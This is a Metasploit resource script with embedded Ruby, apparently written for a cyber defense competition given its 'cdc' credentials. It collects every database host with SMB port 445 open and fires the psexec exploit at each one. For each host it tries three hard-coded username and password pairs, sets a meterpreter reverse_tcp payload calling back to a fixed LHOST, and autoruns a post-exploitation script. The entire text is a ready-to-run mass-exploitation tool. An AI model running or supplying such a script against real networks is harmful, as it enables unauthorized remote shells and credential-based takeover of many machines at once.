set THREADS 10
setg LHOST 10.1.40.20
setg AutoRunScript multi_console_command -r 2_post_exploit.rc


<ruby>
port_start = 4444
#arrary for modules
modules = ["exploit/windows/smb/psexec",]

#arrary for hosts
hosts = []

framework.db.services.each do |service|
if service.port == 445
hosts << service.host.address
end
end
self.run_single("setg payload windows/meterpreter/reverse_tcp")
#self.run_single("setg LHOST 1.1.1.1")

#loop modules
modules.each do |exec|
self.run_single("use #{exec}")
puts("\nRunning Module #{exec}")

#for each host with 445 set appropriate configs and run_single
hosts.each do |rhost|
port_start +=1
self.run_single("set RHOST #{rhost}")
self.run_single("set SMBUser cdc")
self.run_single("set SMBPass cdc")
self.run_single("set LPORT #{port_start}")
self.run_single("exploit -j")
end
end

hosts.each do |rhost|
port_start +=1
self.run_single("set RHOST #{rhost}")
self.run_single("set SMBUser admin")
self.run_single("set SMBPass cdc")
self.run_single("set LPORT #{port_start}")
self.run_single("exploit -j")
end

hosts.each do |rhost|
port_start +=1
self.run_single("set RHOST #{rhost}")
self.run_single("set SMBUser administrator")
self.run_single("set SMBPass cdc")
self.run_single("set LPORT #{port_start}")
self.run_single("exploit -j")
end


</ruby>
